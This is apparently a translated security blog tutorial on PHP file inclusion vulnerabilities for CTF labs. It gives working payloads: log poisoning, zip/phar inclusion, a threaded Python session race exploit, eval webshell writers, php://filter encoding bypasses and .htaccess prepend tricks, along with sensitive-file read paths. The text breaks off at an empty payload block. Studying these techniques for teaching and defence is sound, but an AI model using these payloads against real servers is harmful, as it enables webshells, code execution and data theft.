# PHP Security Learning—File Inclusion Vulnerabilities

Author: H3rmesk1t

Data: 2021.05.28

# What is file inclusion

In order to better use the reusability of the code, a file containing function was introduced. The file containing function was included, and the code containing the file was directly used. To put it simply, one file contains another or more files.

# File contains vulnerability causes

The parameters loaded by the file containing function are not filtered or strictly defined, and can be controlled by the user, including other malicious files, resulting in the execution of unexpected code.
For example: `$_GET['filename']` has not been strictly filtered and directly brought into the include function, you can modify the value of `$_GET['filename']` and perform unexpected operations

```php
<?php
    $filename = $_GET['filename'];
    include($filename);
?>
```

# php raises four functions that contain vulnerabilities in the file

- include()
- include_once()
- require()
- require_once()

>The difference between include() and require():
Require() will exit directly if an error occurs during the inclusion process and will not execute subsequent statements
Require() will only issue a warning if an error occurs during the inclusion process, but will not affect the execution of subsequent statements

# Types of vulnerabilities in the file

When the included file is local to the server, a local file is included; when the included file is local to the third-party server, a remote file is included.
## Local file contains
### No restrictions

```php
<?php
show_source(__FILE__);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    echo "Can you find me???";
}
?>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/2021052715133591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527151346429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Since there is no limitation, you can obtain other content in the system through directory traversal vulnerabilities. Because the file content is often combined with arbitrary file reading vulnerabilities, we will summarize some common file reading paths in the Liunx environment.

```php
/etc/apache2/*
#Apache configuration file, you can learn about web directory, service port and other information
/etc/nginx/*
#Nginx configuration file, you can learn about web directory, service port and other information
/etc/crontab
#Timed task file
/etc/environment
#Environment variable configuration file. Environment variables may have a large amount of directory information leaked, and may even have secret key leaked.
/etc/hostname
#Hostname
/etc/hosts
#Host name query static table, containing paired information of the specified domain name resolution IP. Through this file, you can detect network card information and intranet IP/domain name
/etc/issue
#System version information
/etc/mysql/*
#mysql configuration file
/etc/my.cnf
#mysql configuration file
/etc/mysql/my.cnf
#MYSQL configuration file
/etc/php/*
#PHP configuration file
/proc directory
#/proc directory usually stores various information about the dynamic running of the process. It is essentially a virtual directory. If you view information that is not the current process, pid can be brute-forced. If you want to view the current process, you just need /proc/self instead of /proc/[pid].
/proc/[pid]/cmdline
#cmdline can read more sensitive information
# ssh log, attack method:
ssh `<?php phpinfo(); ?>`@192.168.1.1
/var/log/auth.log
# apache log
/var/log/apache2/[access.log|error.log]
#apache configuration file (ubuntu)
/etc/apache2/apache2.conf
#apache configuration file (centos)
/etc/httpd/conf/httpd.conf
```
### Restrict the suffix name of the included file

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file . ".H3rmesk1t");
}else{
    echo "Cam you find me???"
}
?>
```

**The first method: %00 truncation**
- Prerequisite: PHP<5.3.4
- magic_quotes_gpc = Off

![Insert the picture description here](https://img-blog.csdnimg.cn/20210527153839668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052715384856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The second method: length cutoff
- Prerequisite: PHP version <=5.2.?
- The operating system has a length limit for directory strings: the maximum length of the directory under Windows is 256 bytes, and the excess will be discarded; the maximum length of the directory under Linux is 4096 bytes, and the excess will be discarded; for example, in Windows operating systems, `.` exceeds 256 bytes, and just repeat `./` in Linux.

![Insert the picture description here](https://img-blog.csdnimg.cn/20210527154820642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**The third method: zip/phar protocol**

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file.".jpg");
}else{
    echo "Can you find me???"
}
?>
```
It is obvious that this is a file containing, but a ".jpg" suffix is ​​forced to be added to the passed file name, which makes it impossible to include any file.
First, we create a new shell.php file, with the following content:

```php
<?php phpinfo();?>
```

- And rename it to test.jpg, because the above code can only contain jpg files
- Then compress it into a zip package. When compressing, be careful to choose options such as only store to prevent data from being compressed.
- Then change the suffix of this zip to jpg Such (sometimes, it can be successful if you don't change it, and you can successfully use the zip suffix). The purpose is to successfully upload it. After that, we can use: `http://localhost/H3rmesk1t/demo.php?file=zip://D:/Users/86138/Desktop/shell.zip%23shell` or `http://localhost/H3rmesk1t/demo.php?file=zip://D:/Users/86138/Desk top/shell.jpg%23shell` or `http://localhost/H3rmesk1t/demo.php?file=phar://D:/Users/86138/Desktop/shell.zip/shell` or `http://localhost/H3rmesk1t/demo.php?file=phar://D:/Users/86138/Desktop/shell.jpg/shell`

![Insert the image description here](https://img-blog.csdnimg.cn/2021052716515172.png?x-
oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527165359687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527165519527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/2021052716553289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

- zip://file path/zip file name# file name in compressed package (be careful to URL encoding when using it)
- phar://file path/phar file name/phar file name/phar
- The phar:// protocol is similar to zip://, and you can also access the contents of the zip format compressed package
### Session file contains vulnerabilities

- Prerequisites: PHP version>5.4.0
- Configuration item: The value of session.upload_progress.enabled is On
- Use session.upload_progress for file inclusion, this function was added after php5.4
```php
(Since I did the test in a Windows environment, I removed the restrictions)
<?php
highlight_file(__FILE__);
if(isset($_GET['file'])){
	$file = $_GET['file'];
	// $file = str_replace("php", "xxx", $file);
	// $file = str_replace("data", "xxx", $file);
	// $file = str_replace(":", "xxx", $file);
	// $file = str_replace(".", "xxx", $file);
	include($file);
}else{
	echo "Can you find me???";
}
?>
```
Several default options for php.ini:
```h
session.upload_progress.enabled = on
# Indicates that the upload_progress function begins, that is, when the browser uploads a file to the server, php will store the detailed information of the file upload (such as upload time, upload progress, etc.) in the session
session.upload_progress.cleanup = on
# Indicates that when the file upload is completed, php will immediately clear the contents in the corresponding session file.
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
# represents the key name in the session
session.use_strict_mode=off
# Indicates that the sessionid in the cookie is controllable
```
For example: Upload the file under the condition of `session.upload_progress.name='PHP_SESSION_UPLOAD_PROGRESS'`, and then some information related to this upload will be stored in `session['upload_progress_D1no']`, and stored in `/tmp/sess_H3rmesk1t`

```html
// PHPSESSION = H3rmesk1t
<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="D1no" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527171251145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Through the above figure and the introduction of several default options, I want to use session.upload_progress to write malicious statements and then include files, but the prerequisite is that you need to know the storage location of the session.upload_progress

The storage mechanism of session in PHP:
- The content in the session in php is not stored in memory, but is stored in the form of a file. The storage method is determined by the configuration item `session.save_handler`. The default is to be stored in the form of a file. The name of the stored file is named by the `sess_sessionid`. The content of the file is the content after the session value is serialized. As for the storage path, it is determined by the configuration item `session.save_path`.

> Generally, the storage path of the session will not be changed much, the default is:
- linux: /tmp or /var/lib/php/session
- Windows: C:\WINDOWS\Temp

>I know the storage path, but since there is no session_start() function in the code, the session file cannot be created; in fact, if the configuration item session.auto_start=On is open, then PHP will automate the session when receiving the request, and no longer need to execute the function, but it is closed by default. There is also a default option in the session, which is the default value of session.use_strict_mode mentioned above is 0, and users can define the SessionID by themselves.

```php
Settings in cookies:
PHPSESSID = H3rmesk1t
PHP will create a file on the server (default path)
/tmp/sess_H3rmesk1t

Even if the user does not initialize the Session at this time, PHP will automatically initialize the Session.
And generate a key value, which consists of ini.get("session.upload_progress.prefix") + the session.upload_progress.name value we construct, and is finally written to the sess_file
```

There is another problem that has not been solved. The default configuration session.upload_progress.cleanup = on causes the content of the session file to be cleared immediately after the file is uploaded. Therefore, it is necessary to use multiple threads to write and read at the same time, conduct conditional competition, and include and utilize before the session file is cleared.

```python
import requests
import io
import threading

url = 'http://xxx.xxx.xx.xx:80/H3rmesk1t/demo.php'
sessID = 'H3rmesk1t'

def write(session):
    #Judge whether the event flag is True
    While event.isSet():
        #Uploading files is larger, which is more conducive to conditional competition
        f = io.BytesIO(b'H3rmesk1t' * 1024 * 50)
        reponse = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS':'<?php system("cat flag");?>'},
            files={'file':('text.txt',f)}
        )
def read(session):
    While event.isSet():
        reponse = session.get(url + '?file
=/phpstudy/phpstudy_x64/phpstudy_pro/Extensions/tmp/sess_{}'.format(sessID))
        if 'D1no' in response.text:
            print(reponse.text)
            # Set the event flag to False, and all threads calling the wait method will be blocked;
            event.clear()
        else:
            print('[*]continued')

if __name__ == '__main__':
    #Threading.Event() can create an event management flag, which defaults to False
    event = threading.Event()
    #Set the event flag to True, and all threads calling the wait method will be awakened;
    event.set()
    #Session mechanism (Session) is used in PHP to keep users accessing relevant data continuously when they are accessing web applications.
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=read, args=(session,)).start()
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527175151787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

This way you can get the flag. In addition, you can also use burp to conduct conditional competition, such as uploading a file using the following html upload code

```html
<!DOCTYPE html>
<html>
<body>
<form action="http://localhost/H3rmesk1t/demo.php" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="H3rmesk1t" />
<input type="file" name="file" />
<input type="submit" value="submit" />
</form>
</body>
</html>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527210427952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Then grab a get package according to the code and request /tmp/sess_flag

![Insert the picture description here](https://img-blog.csdnimg.cn/20210527210518638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Blasting is carried out at the same time, and the payload is set to null payloads and it can be blasted all the time.

![Insert the picture description here](https://img-blog.csdnimg.cn/20210527210557830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## Remote Included

Prerequisites for utilization:
- allow_url_fopen = On Whether to allow the opening of remote files
- allow_url_include = On Whether to allow include/require remote files

### No restrictions

There is no restriction on the code. You can just store malicious webshells on the public website, and then execute malicious payloads by including them.
`?filename=http://xxxx/php.txt`

### Restrict the suffix name of the included file

For example: `<?php include($_GET['filename'] . ".no"); ?>`


- The first method:?Bypass `?filename=http://xxxx/php.txt?`
- The second method: #Bypass `?filename=http://xxxx/php.txt%23`

# PHP Pseudo-Protocol

Simply understand it is a set of protocols provided by PHP, which can be applied to its own language, while other languages ​​do not apply. This is a pseudo-protocol. In contrast, HTTP\HTTPS is not a pseudo-protocol, because most systems\software can identify it.

## Common pseudo-protocols

You can see the contents of [Detailed explanation of PHP Pseudo-Protocol] (https://blog.csdn.net/LYJ20010728/article/details/110312276) between the two
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527211634446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
If the environment encountered has write permission, you can use the php://input pseudo-protocol to write to the Trojan

```php
POST DATA
<?php fputs(fopen('H3rmesk1t.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
```
## php://filter various filters

php://filter is a meta wrapper designed to filter applications when data flow is opened. For details, please refer to [official document] (https://www.php.net/manual/zh/wrappers.php.php)

For php://, it supports nesting of multiple filters, and the format is as follows:

```p
php://filter/[read|write]=[filter 1]|[filter 2]/resource=file name (including suffix name)
# If | is filtered out, you can use multiple filters:

php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=file name (including suffix name)
# The execution process of the nested process is from left to right

In fact, it can be abbreviated as php://filter/[filter], and php will identify it by itself.
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527212439780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## Filter list
| Filter Name | Description | Category | Version |
|---|---|---|---|
string.rot13 |rot13 conversion | string filter | PHP>4.3.0
string.toupper, string.tolower|Case transfer|String filter|PHP>5.0.0
string.strip_tags| Remove the content of `<?(.*?)?>`| string.strip_tags| PHP<7.3.0
convert.base64-encode, convert.base64-decode | base64 encoding conversion | Conversion filter | PHP>5.0.0
convert.quoted-printable-encode, convert.quoted-printable-decode| URL encoding conversion | Conversion filter | PHP>5.0.0
convert.iconv.Encoding 1.Encoding 2 | Arbitrary encoding conversion | Conversion filter |PHP>5.0.0
zlib.deflate, zlib.inflate| zlib compression|pressure
Shrink filter |PHP>5.1.0
bzip2.compress, bzip2.decompress| zlib compression| compression filter|PHP>5.1.0

From the filter list above, you will find that the PHP pseudo protocol mainly supports the following categories:
>1. String filter
>2. string.strip_tags
>3. Convert filter
>4. Compression filter
>5. Encryption filter

## Common functions of PHP pseudo-protocol

**Note that show_source has echoes, while file_get_contents has no echoes**
- file_get_contents
- file_put_contents
- readfile
- fopen
- file
- show_source
- highlight_file
## file_put_content and death/mixed code
CTF often examines codes like this:
- `file_put_contents($filename,"<?php exit();".$content);`
- `file_put_contents($content,"<?php exit();".$content);`
- `file_put_contents($filename,$content . "\nxxxxxx");`

>This kind of code is very common. The exit process is added at the beginning of $content, and it cannot be executed even if a sentence is written. When encountering this problem, the general solution is to use the pseudo protocol `php://filter` and combine it with encoding or corresponding filters to bypass it; the bypass principle is to decompose the dead or mixed code into code that cannot be recognized by PHP.

### The first case

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    file_put_contents($file,"<?php exit();".$content);
}else{
    highlight_file(__FILE__);
}
```

**Base64 encoding bypass: **
- The above mentioned that the principle of bypassing is to decompose the death or mixed code into code that cannot be recognized by PHP
- Use base64 encoding because base64 can only print 64 (a-z0-9A-Z) printable characters. When PHP decodes base64, if it encounters characters that are not included, it will skip these characters and then form a new string to decode the legal characters.
- After $content is added with `<?php exit; ?>`, you can use `php://filter/convert.base64-decode` to decode it. During the decoding process, the character range of characters that do not conform to the base64 encoding will be ignored, so the characters that are finally decoded are only phpexit and other characters passed in.
- But you also need to know that when base64 decodes, there are 4 bytes in a group, and only 7 characters are decoded normally on it, so add 1 character a manually to gather 8 characters

```php
Payload:

?file=php://filter/convert.base64-decode/resource=H3rmesk1t.php
POST DATA
content=aPD9waHAgcGhwaW5mbygpOyA/Pg==
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527222810905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**rot13 encoding bypass: **
Using rot13 encoding is actually the same as base64 encoding bypass principle. As long as it becomes a code that cannot be recognized by PHP, it will not be executed.
 The premise is that PHP does not enable short_open_tag (short tag), and it is not enabled by default.

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052722422210.png#pic_center)

```php
Payload:

<?php
$s = '<?php @eval($_GET[cmd]); ?>';
echo str_rot13($s)
?>
=>
<?cuc @riny($_TRG[pzq]); ?>

?file=php://filter/write=string.rot13/resource=test1.php
POST DATA
content=<?cuc @riny($_TRG[pzq]); ?>
```

![Insert the picture description here](https://img-blog.csdnimg.cn/20210527224411264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**Nested bypass: **
The strip_tags() function strips the HTML, XML and PHP tags in the string (removed after php7.3)

>`string.strip_tags` can remove HTML, XML and PHP tags from stripped strings, and `<?php exit; ?>` is actually an XML tag. Since it is an XML tag, you can use the strip_tags function to remove it. Therefore, you can first encode the webshell with base64, and then base64-decode after calling strip_tags. Death exit is removed in the first step, while webshell is restored in the second step.

```php
Payload:

#php5
?file=php://filter/string.strip_tags|convert.base64-decode/resource=test2.php
POST DATA
content=?>PD9waHAgcGhwaW5mbygpOyA/Pg==
#Because <?php exit(); is not a complete tag, you need to add ?> to complete it
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210527234732519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

However, this method has limitations, because string.strip_tags will have segfaults in environments above php7.3, which will lead to unwritten. In environments of php5 or php7.2, it will not be affected by this.

**Filter nesting: **
If the environment is php7, you can also use the filter nesting method to do it
The process is to superimpose three filters and then compress them, then turn to lowercase, and then decompress them. After the execution of this process, some death code errors will be caused, so you can write them into the shell we want to write. The principle is very simple, which is to use the nesting method of filters to decompose and disrupt the death code between various transformations, and eventually become characters that cannot be recognized by PHP.

```php
Tested available Payloads:

?file=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=a.php
POST DATA
content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[cmd]);?>/resource=a.php
Or (never tried)
content=php/:|<?php%0Dphpinfo();?>/resource=test3.php
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528000436209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**.htaccess pre-included utilization: **
.htaccess is a plain text file that stores some instructions related to Apache server configuration. It is similar to Apache's site configuration file, but it only works on the current directory, and is loaded only when the user accesses the directory. Through this file, you can realize web page 301 redirection, customize 404 error page, change file expansion name, prohibit directory lists, etc.
Setting the auto_prepend_file or auto_append_file configuration options through php_value contains some sensitive files. At the same time, a parsable php file is required in this directory or subdirectory to trigger it. At this time, no matter which file is accessed, flag.php will be parsed.
`php_value auto_prepend_file + absolute path of the file (default is the currently uploaded directory)`

```php
Payload:

?file=php:/
/filter/write=string.strip_tags/resource=.htaccess
POST DATA
content=?>php_value%20auto_prepend_file%20D:\phpstudy\phpstudy_x64\phpstudy_pro\WWW\H3rmesk1t\flag.php
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528013348907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

### The second situation

```php
<?php
if(isset($_GET['content'])){
    $content = $_GET['content'];
    file_put_contents($content,"<?php exit();".$content);
}else{
    highlight_file(__FILE__);
}
```

This situation is a bit different from the first one above, because it is a variable, but you can still use the php pseudo protocol to nest filters to eliminate the dead code. You can use .htaccess for pre-inclusion and then read the flag

**.htaccess pre-included bypass: **
You can directly customize the pre-included files, which directly includes .htaccess causes all files to contain flag.php files.
Here I cannot execute .htaccess when testing natively. I borrowed some other people's pictures (it's still too bad~~)


```php
payload:

?content=php://filter/string.strip_tags/?>php_value auto_prepend_file D:\flag.php%0a%23/resource=.htaccess
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528013232306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**Base64 encoding bypass: **
 - Since it has become a variable, the first payload that comes to mind is: `php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=H3rmesk1t.php` However, there is a problem. You can create a file, but you cannot write the content. The reason is on the = sign, because by default, base64 encoding ends with =. When the normal decoding is reached, the decoding ends. When the file name is finally obtained, the decoding is thought that the decoding is over, which causes the filter to decoding to fail, and thus an error is reported. The content is discarded due to an error in the decoding process.
 - So now the problem is changed to as long as the equal sign can be removed, the content can be written in. You can see this method: `php://filter/<?|string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2B.php`If you follow the previous idea, close the death code first, then use the filter to remove the html tag, and then decode it, but carefully observe that this payload is not the solution, but directly write the equal sign problem encountered by base64 directly in <? ?> for filtering out, and then base64-decode transcodes the original content <?php exit(); to achieve the purpose of decomposing the death code.
 - In addition, you can also use the previous idea. Since base64 encoding cannot be written inside, then put it directly outside and match the filter `php://filter/string.strip.tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2B.php` first close the death code and then decode it. This can be written to the file, but there will be problems when accessing. Check the method of s1mple and find that you can bypass it by using the pseudo-directory method. Go to `php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2B/../H3rmesk1t.php`, treat the previous string of base64 characters and closed symbols as a directory as a directory. Although there is no, the original directory is retracted and the H3rmesk1t.php file is generated; thus, the normal file name can be generated. The above method can also use this pseudo-directory method to solve the access problem.

**rot13 encoding bypass: **
Rot13 does not need to consider the = number issue

```php
Payload:

?content=php://filter/string.rot13/<?cuc cucvasb();?>/resource=1.php
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528003428286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**iconv character encoding bypass: **
In PHP, the iconv function library can complete the conversion between various character sets
There is a filter like `convert.iconv.` under this function library. This filter requires php to support iconv, and iconv is compiled by default. Using the `convert.iconv.*` filter is equivalent to using the iconv() function to process all stream data

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528003937955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The method of using this filter is to convert the encoding, convert the death code, and write it to your own shell. First of all, you need to understand the two encoding formats of UCS-2 and UCS-4:
- UCS-2 is encoded in two bytes
- UCS-4 is encoded in four bytes

Let’s take a look at the result of using this function, that is, a different format:
The second reason for adding two characters is that UCS-4 reverses the target string by 4 bits, so you should pay attention to the malicious code here being multiples of 4, so you need to add two characters here.
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528004353240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**UCS-2 Utilization: **
2-bit inversion of the target string
(Be sure to calculate the length, and the content written to the php file must be a multiple of 2 before `?<hp phpipfn(o;)>?`, just like the payment load in front of the following is 57 characters, and one is added to make up 58 characters. You can pass the local test of the payment load when doing the test and use it after success)

```php
Payload:

?content=php://filter//convert.iconv.UCS-2LE.UCS-2BE|??<hp phpipfn(o;)>?/resource=22.php
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528005559849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**UCS-4 Utilization: **
To reverse the target string by 4 bits, you must piece together multiples of 4 (the construction principle is the same as UCS-2)

```php
Payload:

?content=php://filter//convert.iconv.UCS-4LE.UCS-4BE|aaa?<ba phpiphp(ofn>?;)/resource=33.php
```
![Insert the image description here](https://img-blog.csdnimg.cn/20210528010720688.png?x-oss-process=image/watermark,type_
ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**Combination punch UTF-8/UTF-7: **
The above base64 encoding `php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=H3rmesk1t.php` is the reason why payload cannot be executed is because it is affected by the equal sign. However, through testing, it is found that the conversion between UTF-8 and UTF-7 can be used to bypass the equal sign. When decoding, it is found that = there is no conversion back.

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528011231613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

So this feature can be used to nest filters to bypass the equality sign

```php
Payload:

php://filter/write=PD9waHAgcGhwaW5mbygpOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=H3rmesk1t.php

After testing, it was found that write= must be written in. If you do not write PHP, it will not be automatically recognized. At the same time, the content must be written in the front. If you write in the back, it will be written in, but it cannot be parsed, such as:
php://filter/write=convert.iconv.utf-8.utf-7|convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=H3rmesk1t.php
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528011717550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**UCS2/ROT13, UCS4/ROT13: **
After testing it myself, this process recognizes spaces when using UCS2 or UCS4 for encoding, but when using pseudo-protocol, it is necessary to invert and decode, but it cannot recognize spaces. This is why the payload below needs to add one more character.

```php
Payload:

?content=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?<uc cucvcsa(b;)>?/resource=shell.php
# Note that you need to add a character here, because spaces cannot be reversed with any character
```

![Insert the picture description here](https://img-blog.csdnimg.cn/20210528012033631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**UCS4/ROT13:**

```php
?content=php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|string.rot13|x?<xx cucvcuc(bsa>?;)/resource=shell1.php
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210528012805901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
### The third situation

```php
<?php
if(isset($_GET['content'])){
    $filename = $_GET['filename'];
    $content = $_GET['content'];
    file_put_contents($filename,$content . "\nxxxxxx");
}else{
    highlight_file(__FILE__);
}
```

Generally speaking, languages ​​with special starting characters and ending symbols are prohibited. If you can't help, you can execute them by writing them directly into the PHP code. The subsequent restrictions are meaningless. This type of problem often requires finding a way to deal with mixed code.

**.htaccess bypass: **
Use the .htaccess file to bypass it, and it is necessary to note that the file is very sensitive. If there is mixed code, an error will occur, resulting in the inability to operate. You can use comments to comment out the mixed code.

```php
Payload:

